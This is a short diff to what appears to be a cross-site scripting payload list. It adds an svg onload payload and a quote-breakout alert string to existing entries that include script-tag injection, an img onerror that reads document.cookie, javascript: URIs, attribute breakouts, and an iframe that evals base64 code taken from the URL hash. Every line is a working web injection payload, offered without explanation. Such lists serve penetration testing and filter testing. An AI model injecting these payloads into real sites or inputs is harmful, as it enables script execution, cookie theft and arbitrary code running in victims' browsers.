@@ -1,6 +1,8 @@
 "><script>alert(prompt(document.domain))</script>
 "><img src=1 onerror=alert(document.cookie)>
 javascript:alert(document.domain)
+"><svg onload=alert(1)>
+'-alert(9)-'
 \';alert(99);//
 "onmouseover="alert(1)
 "<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
